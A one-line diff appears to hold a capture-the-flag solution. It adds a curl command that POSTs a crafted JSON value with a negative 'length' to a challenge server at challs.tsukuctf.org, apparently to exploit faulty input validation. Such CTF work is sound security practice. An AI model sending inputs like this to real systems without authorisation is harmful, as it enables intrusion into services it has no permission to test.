@@ -1,0 +1,1 @@
+curl -X POST -d 'array={"length":-1}' http://challs.tsukuctf.org:28888
